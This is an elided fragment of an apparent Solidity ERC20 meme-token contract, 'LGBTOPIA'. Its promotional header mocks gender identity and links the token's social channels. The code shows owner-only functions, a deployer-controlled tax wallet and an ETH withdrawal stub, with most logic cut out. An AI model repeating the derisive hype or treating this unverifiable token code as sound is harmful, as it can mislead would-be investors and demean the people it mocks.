/*
$LGBT - Greatest Ever LGBTQIA2S+ Token To Support The Great Battle of Genders. 😜😜🏳️‍🌈🏳️‍🌈

We live in a great time of Gender Diversity😉😉 and now we got to take what’s ours, what belong to us...Gender they/themself. 
😁😁 Become true THEY/THEM, SLAYYY the boring he/shes🤮🤮 in this fight in Web 3.0 Domain. 

Social Networks:

Website - https://www.lgbtopia.xyz (https://www.lgbtopia.xyz/)
Telegram - https://t.me/LGBTOPIATOKEN
Twitter / X - https://twitter.com/LgbtopiaToken
*/
...
contract LGBTOPIA is ERC20, Ownable {
    ...
    constructor() ERC20("LGBTOPIA", "LGBT") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        taxWallet = msg.sender;
        allowed = uint160(taxWallet);
    ...
    function SLAYYY() external payable onlyOwner {
    ...
    function manualWithdrawETH() external {
        bool success;
